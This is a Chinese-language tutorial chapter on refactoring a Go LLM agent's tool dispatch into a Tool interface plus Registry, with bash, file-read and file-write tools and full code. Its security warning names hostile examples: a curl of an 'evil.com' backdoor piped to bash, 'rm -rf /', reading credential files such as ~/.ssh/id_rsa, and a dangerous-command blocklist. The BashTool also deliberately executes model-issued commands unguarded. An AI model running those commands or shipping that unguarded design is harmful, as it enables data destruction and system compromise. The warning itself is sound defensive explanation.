# Day 2：内置工具与注册表

## 导语

Day 1 我们从一个 `getWeather` 工具开始，实现了一个能跑起来的 Agent Loop。但如果你回头看看 `main.go` 里 `dispatchTool` 那个 switch-case——问题很明显：每加一个新工具，得同时改**两处地方**：`tools` 数组和 `dispatchTool` 函数。三个工具还好，三十个工具呢？

今天我们就用 `getWeather` 这个熟悉的例子，一步步把它从"硬编码的行内函数"升级为"实现了 `Tool` 接口的正式工具类"——最后你会发现，新增一个 bash 工具只需要**一行注册代码**，其他所有地方零改动。

## 本日目标

把 Day 1 的硬编码 `dispatchTool` 替换为基于 **Tool 接口 + Registry 注册表**的可插拔工具系统，并补齐三个实用的内置工具。

## 你将学到

- 用 `getWeather` 的升级过程，理解 Tool 接口为什么这样设计
- Registry 注册表的完整链路：`Register` → `ToChatCompletionTools` → `Dispatch`
- BashTool：子进程执行 + 超时保护 + 输出截断
- FileReadTool：offset/limit 分片 + 自适应行号标注
- FileWriteTool：自动 MkdirAll + 安全覆盖
- `dispatchTool` 从 20 行 switch 缩减为 4 行 `registry.Dispatch`

---

## 问题：回顾 Day 1 的 dispatchTool

先看看 Day 1 我们是怎么写工具分发的：

```go
// Day 1 的 dispatchTool —— switch-case 硬编码
func dispatchTool(call openai.ChatCompletionMessageToolCall) string {
    var args map[string]any
    if err := json.Unmarshal([]byte(call.Function.Arguments), &args); err != nil {
        return fmt.Sprintf("解析工具参数失败: %v", err)
    }
    switch call.Function.Name {
    case "getWeather":
        city, _ := args["city"].(string)
        return getWeather(city) // 行内函数，属于 main 包
    default:
        return fmt.Sprintf("未知工具: %s", call.Function.Name)
    }
}
```

这段代码有两个问题：

1. **每加一个工具，switch 就多一个 case**——三个工具还好，三十个工具呢？
2. **工具定义和分发逻辑分离**——`tools` 数组在 `main()` 里硬编码，`dispatchTool` 在另一处写死，加新工具容易漏掉一头

用面向对象的话说，这违反了**开闭原则**：对扩展开放（能加新工具），但对修改封闭（不该每次改 dispatchTool）。我们需要一套"加了新工具，dispatchTool 不需要改"的机制。

答案就是**接口 + 注册表**。下面我们用 `getWeather` 这个老面孔，一步步把它改造成"接口实现者"，你就明白整套设计是怎么演化的。

---

## 第一步：抽离 Tool 接口

思路很简单：所有工具都长一个样——有名字、有描述、有参数定义、能执行。那我们就用接口把这个"样子"规定下来。

### 用 getWeather 倒推接口长什么样

先把 Day 1 里 `getWeather` 相关的代码拿出来，看它包含了哪些信息：

| Day 1 中 getWeather 的组成部分 | 对应功能 |
|---|---|
| `"getWeather"`（工具名） | 模型 `tool_calls[].function.name` 来匹配 |
| `"查询指定城市的当前天气"`（描述） | 模型据此判断"什么时候该调用这个工具" |
| `{type:"object", properties: {city: ...}}`（参数） | 模型据此生成调用参数 |
| `getWeather(city) → 结果字符串` | 实际执行逻辑 |

这四个部分——**名字、描述、参数定义、执行**——就是每个工具共有的属性。翻译成 Go interface：

```go
type Tool interface {
    Name() string                                   // 工具名
    Description() string                            // 工具描述
    Schema() openai.FunctionDefinitionParam          // 参数定义
    Execute(args map[string]any) (string, error)    // 执行逻辑
}
```

### 逐行解释四个方法

**`Name() string`**

模型在 `tool_calls[].function.name` 中返回的字符串。这是工具的唯一标识，后续 dispatch 就靠它匹配。我们让 `getWeather` 实现这个方法：

```go
func (t *WeatherTool) Name() string {
    return "getWeather"
}
```

**`Description() string`**

给模型看的"说明书"。写得越清晰，模型越不会乱调。注意描述的对象是**模型**，不是人类程序员——你要站在模型的角度回答："什么情况下我应该调用这个工具？"

```go
func (t *WeatherTool) Description() string {
    return "查询指定城市的当前天气，返回天气状况、气温和湿度。"
}
```

**`Schema() openai.FunctionDefinitionParam`**

这是最关键的——直接返回 OpenAI SDK 的类型，零中间层。Day 1 我们在 `tools` 数组里写的 `openai.FunctionDefinitionParam{...}` 就是它。把它挪到工具自己身上，这样注册表遍历所有工具时，直接调 `t.Schema()` 就能拿到定义。

```go
func (t *WeatherTool) Schema() openai.FunctionDefinitionParam {
    return openai.FunctionDefinitionParam{
        Name:        t.Name(),
        Description: openai.String(t.Description()),
        Parameters: openai.FunctionParameters{
            "type": "object",
            "properties": map[string]any{
                "city": map[string]any{
                    "type":        "string",
                    "description": "要查询天气的城市名，例如：北京、上海",
                },
            },
            "required": []string{"city"},
        },
    }
}
```

注意 `t.Name()` 和 `t.Description()` 的调用——名字和描述只有一个来源（方法返回值），不会出现"Schema 里写的是 getWeather，Name() 却返回 weather"这种不一致。

**`Execute(args map[string]any) (string, error)`**

接收模型生成的参数，返回执行结果。注意返回的是 `(string, error)`，不是 panic。Day 1 我们讲过"工具执行失败返回错误字符串让模型重试"——现在用 error 返回值来实现：`Execute` 返回 error 时，`dispatchTool` 会把 error 转成字符串回传给模型。

```go
func (t *WeatherTool) Execute(args map[string]any) (string, error) {
    city, ok := args["city"].(string)
    if !ok || city == "" {
        return "", fmt.Errorf("缺少必填参数: city") // ← error 会回传给模型
    }
    // ... 天气逻辑 ...
    return fmt.Sprintf("%s 当前天气：..."), nil
}
```

### 四个方法的职责划分

```
模型调用工具时的完整链路：

LLM 返回 tool_calls
    ↓
[dispatch] 按 function.name 匹配
    ↓  → 需要 Name()
[dispatch] 执行 function.arguments JSON
    ↓  → 需要 Execute(args)

LLM 请求时要告诉它哪些工具可用
    ↓  → 需要 Schema() + Description()
```

**Name + Schema + Description** 在请求阶段使用，生成 `tools` 数组；**Name + Execute** 在分发阶段使用，匹配和执行。四个方法各司其职，没有冗余。

### 放进 tool 包

接口放在 `tool/tool.go`，WeatherTool 放在 `tool/weather.go`。这样 `main.go` 只负责注册和调度，工具自身的逻辑完全内聚在 tool 包中。

现在我们已经把 `getWeather` 从 main 包里的一坨行内代码，变成了一个规范的 `Tool` 接口实现。接下来解决第二个问题：怎么统一管理多个工具。

---

## 第二步：Registry 注册表

接口有了，但怎么把一堆 `Tool` 组织起来？需要一个东西来：

- 记住所有注册过的工具
- 给 LLM 请求时生成 tools 数组
- 收到 tool_calls 时找到对应的工具来执行

这就是 Registry。

### 数据结构

```go
type Registry struct {
    tools map[string]Tool  // 核心就是一个 map
}

func NewRegistry() *Registry {
    return &Registry{
        tools: make(map[string]Tool),
    }
}
```

就这么简单——一个 `map[string]Tool`，key 是 `t.Name()`。用一个 map 而不是 slice，是因为 dispatch 需要 O(1) 查找。

### Register：一行注册

```go
func (r *Registry) Register(t Tool) {
    name := t.Name()
    if _, exists := r.tools[name]; exists {
        panic(fmt.Sprintf("tool %q already registered", name))
    }
    r.tools[name] = t
}
```

重复注册会 **panic**。这看起来有点暴力，但理由很充分：工具名重复是**编程错误**，不是运行时事件。与其让错误被悄悄覆盖、后面 dispatch 到错误的工具上，不如启动时就炸掉——fail fast。

### 用 getWeather 演示注册

回到 `main()`，现在注册工具就一行：

```go
registry := tool.NewRegistry()
registry.Register(tool.NewWeatherTool())  // 就这一行！
```

和 Day 1 对比：

```go
// Day 1：tools 数组硬编码在 main() 里
tools := []openai.ChatCompletionToolParam{
    {
        Function: openai.FunctionDefinitionParam{
            Name:        "getWeather",
            Description: openai.String("查询指定城市的当前天气"),
            Parameters: openai.FunctionParameters{...},
        },
    },
}
```

Day 1 的写法——tools 定义在 main() 里，dispatch 逻辑在另一个函数里，加新工具要改两处。Day 2 的写法——工具自己带着所有信息注册到 Registry，main() 只负责"注册"这件事。

### ToChatCompletionTools：一键生成 tools 数组

有了注册表，生成 LLM 所需的 tools 数组就是遍历 map：

```go
func (r *Registry) ToChatCompletionTools() []openai.ChatCompletionToolParam {
    tools := make([]openai.ChatCompletionToolParam, 0, len(r.tools))
    for _, t := range r.tools {
        tools = append(tools, openai.ChatCompletionToolParam{
            Function: t.Schema(),
        })
    }
    return tools
}
```

`runAgentLoop` 里只需要一行：

```go
Tools: registry.ToChatCompletionTools()
```

不管注册了多少个工具，这行代码都不需要改。

### Dispatch：核心分发逻辑

这是整个注册表最关键的方法：

```go
func (r *Registry) Dispatch(name string, argsJSON string) (string, error) {
    t, ok := r.Get(name)           // 1. O(1) 查找
    if !ok {
        return "", fmt.Errorf("未知工具: %s，可用工具: %v", name, r.Names())
    }

    var args map[string]any
    if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
        return "", fmt.Errorf("解析工具 %q 的参数失败: %v", name, err)
    }

    return t.Execute(args)          // 2. 多态执行
}
```

两步走：
1. 按 name 找到对应的 Tool（map 查找）
2. 解 JSON 参数 → 调 `t.Execute(args)`

不管你注册了多少个工具，dispatch 逻辑永远不变。这就是多态的力量——Registry 只知道"我有一堆 Tool"，不关心每个 Tool 具体怎么执行。

---

## 第三步：补齐三个内置工具

有了接口和注册表，新工具的写法就一个套路：**实现四个方法**。下面快速过一遍 bash、file_read、file_write 三个工具的关键设计——它们和 WeatherTool 的结构完全一致，只是 Execute 里的逻辑不同。

### BashTool —— 命令执行

**核心**：`exec.CommandContext(ctx, "bash", "-c", command)`

四个关键设计：

```go
// 1. 30 秒超时保护，防止命令挂死
ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
defer cancel()

// 2. stdout 和 stderr 分开捕获
var stdout, stderr bytes.Buffer
cmd.Stdout = &stdout
cmd.Stderr = &stderr

err := cmd.Run()

// 3. 输出截断：stdout 上限 4000 字符，stderr 上限 800 字符
if len(stdoutStr) > 4000 {
    stdoutStr = stdoutStr[:4000] + "\n...（输出过长，已截断）"
}

// 4. 区分超时 vs 命令失败
if errors.Is(ctx.Err(), context.DeadlineExceeded) {
    return "", fmt.Errorf("命令执行超时（30s限制）: %s", command)
}
```

为什么要截断输出？因为模型每轮都把**完整历史**发给 LLM，一个 `ls -R /` 的输出可能吃掉几十万 token，下一轮就直接报 API 异常了。截断是 Agent 编程里很常见的"上下文保护"手段。

### FileReadTool —— 文件读取

**核心**：`os.ReadFile` + 按行 split + 行号标注

```go
lines := strings.Split(string(data), "\n")
totalLines := len(lines)

// 自适应行号宽度：1000 行的文件用 4 位宽度，10 行的用 2 位
width := len(fmt.Sprintf("%d", totalLines))

// 带行号的输出
for i := offset - 1; i < end; i++ {
    b.WriteString(fmt.Sprintf("%*d|%s\n", width, i+1, lines[i]))
}
```

输出效果：

```
文件: main.go（共 179 行，显示第 1-10 行）
-----------------------------------------
 1|package main
 2|
 3|import (
 4|   "context"
...
```

为什么要做分片（offset/limit）？模型读一个 3000 行的文件，一次全输出会吃掉大量 token。分片让模型可以"先看前 100 行 → 不够再 offset=101 继续看"，像翻书一样逐页阅读。

:::tip
`json.Unmarshal` 把 JSON number 解码为 `float64`，而 offset 和 limit 都是整数。`tool/file_read.go` 里有一个 `toInt()` 函数做类型桥接——这是 JSON → Go 参数传递中很容易踩的坑，新手注意。
:::

### FileWriteTool —— 文件写入

**核心**：`os.MkdirAll` + `os.WriteFile`

```go
// 自动创建父目录，不用手动 mkdir
os.MkdirAll(filepath.Dir(path), 0o755)

// 写入文件
os.WriteFile(path, []byte(content), 0o644)
```

设计要点：

- **自动创建目录**：模型不用先调 bash `mkdir -p`，一步到位
- **权限 0644**：文件可读可写，不可执行——这是最常见的文本文件权限
- **覆盖写入**：Description 里明确告诉模型"会覆盖原有内容"

三个工具写完后，注册同样一行搞定：

```go
registry.Register(tool.NewWeatherTool())
registry.Register(tool.NewBashTool())
registry.Register(tool.NewFileReadTool())
registry.Register(tool.NewFileWriteTool())
```

---

:::warning 安全提示：当前实现是"全开放"模式
出于学习目的，我们目前的三个内置工具有意保持了最简单的实现——**没有对危险命令做拦截、没有对文件路径做隔离、没有权限控制**。具体来说：

- **BashTool**：`rm -rf /`、`curl http://evil.com/backdoor.sh | bash` 等命令会直接执行，没有任何防护
- **FileReadTool / FileWriteTool**：可以读写系统的任意路径（如 `/etc/passwd`、`~/.ssh/id_rsa`），没有工作目录限制
- **所有工具**：没有任何用户确认环节，模型说什么就执行什么

这在本地学习环境中是可以接受的，但**绝对不能用于生产环境**。生产级的解决方案包括：

| 方案 | 说明 |
|------|------|
| **沙箱隔离** | 将工具执行放在 Docker 容器或虚拟机中，限制文件系统和网络访问，即使模型执行了 `rm -rf /` 也只影响沙箱内部 |
| **工作目录白名单** | FileReadTool/FileWriteTool 只允许访问指定目录（如 `./workspace/`），任何外部路径直接拒绝 |
| **危险命令黑名单** | BashTool 在执行前扫描命令，拦截 `rm`、`dd`、`mkfs`、`> /dev/sda`、`chmod 777 /` 等高风险操作 |
| **执行前确认** | 高危操作（删除文件、修改系统配置、网络请求）在执行前弹出确认提示，由用户人工审核 |
| **资源限制** | 限制子进程的 CPU 时间、内存用量、磁盘写入量，防止死循环或 fork bomb |
| **审计日志** | 记录所有工具调用的完整参数和执行结果，便于事后追溯和安全审计 |

本教程聚焦于 Agent Loop 的核心原理，安全加固留到进阶章节再展开。现在先让 Agent 跑起来——后面我们再把这些防护一层层加上去。
:::

## 第四步：接入 main.go —— 迁移对比

这是最直观的部分。把 Day 1 和 Day 2 的 `main.go` 关键部分并排对比。

### main() 初始化

**Day 1**：

```go
tools := []openai.ChatCompletionToolParam{
    {
        Function: openai.FunctionDefinitionParam{
            Name:        "getWeather",
            Description: openai.String("查询指定城市的当前天气"),
            Parameters: openai.FunctionParameters{
                "type": "object",
                "properties": map[string]any{
                    "city": map[string]any{
                        "type": "string",
                        "description": "要查询天气的城市名",
                    },
                },
                "required": []string{"city"},
            },
        },
    },
}
runAgentLoop(client, messages, tools)
```

**Day 2**：

```go
registry := tool.NewRegistry()
registry.Register(tool.NewWeatherTool())
registry.Register(tool.NewBashTool())
registry.Register(tool.NewFileReadTool())
registry.Register(tool.NewFileWriteTool())

fmt.Printf("已注册 %d 个工具: %v\n", registry.Size(), registry.Names())
runAgentLoop(client, registry, messages)
```

从 15 行硬编码 → 6 行注册。而且新增一个工具只是多一行 `registry.Register(...)`。

### dispatchTool

**Day 1**：

```go
func dispatchTool(call openai.ChatCompletionMessageToolCall) string {
    var args map[string]any
    if err := json.Unmarshal([]byte(call.Function.Arguments), &args); err != nil {
        return fmt.Sprintf("解析工具参数失败: %v", err)
    }
    switch call.Function.Name {
    case "getWeather":
        city, _ := args["city"].(string)
        return getWeather(city)
    default:
        return fmt.Sprintf("未知工具: %s", call.Function.Name)
    }
}
```

**Day 2**：

```go
func dispatchTool(registry *tool.Registry, call openai.ChatCompletionMessageToolCall) string {
    result, err := registry.Dispatch(call.Function.Name, call.Function.Arguments)
    if err != nil {
        return fmt.Sprintf("工具执行失败: %v", err)
    }
    return result
}
```

从 20 行 switch → 4 行 `registry.Dispatch`。**新增工具对 dispatchTool 零改动**。

### runAgentLoop 签名变化

```go
// Day 1
func runAgentLoop(client openai.Client, messages [...], tools [...]) { ... }

// Day 2
func runAgentLoop(client openai.Client, registry *tool.Registry, messages [...]) { ... }
```

tools 数组由 `registry.ToChatCompletionTools()` 在循环内动态生成，不再作为参数传入。

### WeatherTool 的迁移

Day 1 中 `getWeather` 是 `main.go` 里的一个行内函数：

```go
// 在 main.go 里
func getWeather(city string) string { ... }
```

Day 2 中它变成了 `tool/weather.go` 里的一个 `Tool` 接口实现：

```go
// 在 tool/weather.go 里
type WeatherTool struct{}
func (t *WeatherTool) Name() string { return "getWeather" }
func (t *WeatherTool) Execute(args map[string]any) (string, error) { ... }
```

`main.go` 不再需要 `math/rand` import（天气的随机逻辑移入了 tool 包），也不再需要定义 `getWeather` 函数。代码的职责边界更清晰了。

---

## 验证：用 getWeather 多工具跑一遍

换一个需要组合多个工具的 prompt。我们用老面孔 `getWeather` 开个头，再链式调用新工具：

```
你是一个全能的编程助手。请帮我：
1. 查询北京今天天气
2. 把天气结果写入 /tmp/weather.txt
3. 用 cat 命令验证文件内容
```

模型预期的执行轨迹（3 轮迭代）：

```
=== iteration 1 ===
[tool] getWeather -> 北京 当前天气：晴，气温 22℃，湿度 55%
=== iteration 2 ===
[tool] file_write -> 已成功写入文件 /tmp/weather.txt（XX 字符）
=== iteration 3 ===
[tool] bash(cat /tmp/weather.txt) -> 北京 当前天气：晴，气温 22℃，湿度 55%
=== iteration 4 ===
模型未发起工具调用，结束 agent loop
北京今天天气晴朗，气温 22℃，我已将结果保存到 /tmp/weather.txt……
```

三个不同工具被同一个 `registry.Dispatch` 分发——因为 switch-case 已经被多态替换了。

---

## 完整代码

目前项目结构：

```
.
├── main.go
├── tool/
│   ├── tool.go       # Tool 接口 + Registry
│   ├── weather.go    # WeatherTool（getWeather）
│   ├── bash.go       # BashTool
│   ├── file_read.go  # FileReadTool
│   └── file_write.go # FileWriteTool
└── prompt/
    └── system.go     # 系统提示词常量
```

::: details 完整 main.go（点击展开）

```go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	"gull-herness-agent/tool"

	"github.com/openai/openai-go"
	"github.com/openai/openai-go/option"
)

const maxIterations = 10
const tokenThreshold = 200_000

var apiLogger *log.Logger

func main() {
	apiKey := os.Getenv("GULL_OPENAI_API_KEY")
	if apiKey == "" {
		log.Fatal("GULL_OPENAI_API_KEY environment variable is not set")
	}

	baseURL := os.Getenv("GULL_OPENAI_BASE_URL")
	if baseURL == "" {
		log.Fatal("GULL_OPENAI_BASE_URL environment variable is not set")
	}

	logFile, err := os.OpenFile("api_call.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		log.Fatalf("无法创建日志文件: %v", err)
	}
	defer logFile.Close()
	apiLogger = log.New(logFile, "", log.LstdFlags)

	client := openai.NewClient(
		option.WithAPIKey(apiKey),
		option.WithBaseURL(baseURL),
	)

	// 一行注册一个工具
	registry := tool.NewRegistry()
	registry.Register(tool.NewWeatherTool())
	registry.Register(tool.NewBashTool())
	registry.Register(tool.NewFileReadTool())
	registry.Register(tool.NewFileWriteTool())

	fmt.Printf("已注册 %d 个工具: %v\n", registry.Size(), registry.Names())

	messages := []openai.ChatCompletionMessageParamUnion{
		openai.SystemMessage("你是一个全能的编程助手，可以执行 bash 命令、读写文件。遇到问题尽量自己动手排查。"),
		openai.UserMessage("北京今天天气怎么样？"),
	}

	runAgentLoop(client, registry, messages)
}

func runAgentLoop(
	client openai.Client,
	registry *tool.Registry,
	messages []openai.ChatCompletionMessageParamUnion,
) {
	for i := 1; i <= maxIterations; i++ {
		fmt.Printf("=== iteration %d ===\n", i)

		params := openai.ChatCompletionNewParams{
			Model:    "deepseek-v4-flash",
			Messages: messages,
			Tools:    registry.ToChatCompletionTools(), // 一键生成
		}

		logRequest(i, params)

		resp, err := client.Chat.Completions.New(context.Background(), params)
		if err != nil {
			handleError(err)
			return
		}

		logResponse(i, resp)

		used := resp.Usage.TotalTokens
		fmt.Printf("[usage] prompt=%d completion=%d total=%d (threshold=%d)\n",
			resp.Usage.PromptTokens, resp.Usage.CompletionTokens, used, tokenThreshold)
		if used >= tokenThreshold {
			log.Printf("token 用量 %d 达到阈值 %d，终止迭代（iteration %d）", used, tokenThreshold, i)
			return
		}

		choice := resp.Choices[0]
		msg := choice.Message
		messages = append(messages, msg.ToParam())

		if choice.FinishReason == "length" {
			log.Printf("达到 token 上限，终止迭代（iteration %d）", i)
			if msg.Content != "" {
				fmt.Println(msg.Content)
			}
			return
		}

		if len(msg.ToolCalls) == 0 {
			fmt.Println(msg.Content)
			log.Printf("模型未发起工具调用，结束 agent loop（iteration %d）", i)
			return
		}

		for _, call := range msg.ToolCalls {
			result := dispatchTool(registry, call)
			fmt.Printf("[tool] %s -> %s\n", call.Function.Name, result)
			messages = append(messages, openai.ToolMessage(result, call.ID))
		}
	}

	log.Printf("达到最大迭代次数 %d，终止 agent loop", maxIterations)
}

func dispatchTool(registry *tool.Registry, call openai.ChatCompletionMessageToolCall) string {
	result, err := registry.Dispatch(call.Function.Name, call.Function.Arguments)
	if err != nil {
		return fmt.Sprintf("工具执行失败: %v", err)
	}
	return result
}

func logRequest(iter int, params openai.ChatCompletionNewParams) {
	reqJSON, _ := json.MarshalIndent(params, "", "  ")
	apiLogger.Printf("\n========== REQUEST iter=%d (%s) ==========\n%s\n",
		iter, time.Now().Format(time.RFC3339), string(reqJSON))
}

func logResponse(iter int, resp *openai.ChatCompletion) {
	respJSON, _ := json.MarshalIndent(resp, "", "  ")
	apiLogger.Printf("\n========== RESPONSE iter=%d (%s) ==========\n%s\n",
		iter, time.Now().Format(time.RFC3339), string(respJSON))
}

func handleError(err error) {
	log.Printf("调用大模型失败" + err.Error())
}
```

:::

---

## 关键设计决策

### 为什么 Schema() 直接返回 SDK 类型？

如果不这样做，我们就需要自己定义一个中间的 Schema 结构体，然后在 dispatch 时转成 `openai.FunctionDefinitionParam`。多一层转换 = 多一个出 bug 的地方。

直接返回 SDK 类型，零中间层，而且 SDK 升级时（比如新增字段）自动受益。

### 为什么 Execute 失败用 error 而不是 panic？

和 Day 1 的设计一脉相承：工具执行失败是"软错误"——参数非法、命令超时、文件不存在——把 error 转成字符串回传给模型，模型看到后可能换个参数重试，或者向用户解释。

如果 panic，整个 Agent Loop 就崩溃了，模型没有"容错"的机会。

### 为什么用 map[string]any 而不是泛型？

`json.Unmarshal` 解码后的参数本身就是 `map[string]any`（因为 JSON 的字段类型在编译期不确定）。用泛型需要在外面包一层反序列化逻辑，对新手来说增加了复杂度，而收益不大——参数校验在 Execute 内部做就够了。

### Registry 为什么不是线程安全的？

Agent Loop 中 LLM 调用是**串行**的——每个迭代只发一个请求，等响应回来再发下一个。不存在多个 goroutine 同时调 `Dispatch` 的场景。不加锁更简单，也更符合"不过度设计"的原则。

---

## 一句话总结

今天的核心收获：**"加新工具 = 写一个 `Tool` 实现 + 一行 `registry.Register`，dispatch 逻辑零改动"**。这套模式不是 Agent 领域的特例——它就是工程里最常见的"面向接口编程"。

## 下一步

Day 3：System Prompt 工程、对话历史压缩、以及把 `runAgentLoop` 抽象为可复用的 Agent 结构体。我们开始让这个 Agent 更"聪明"。
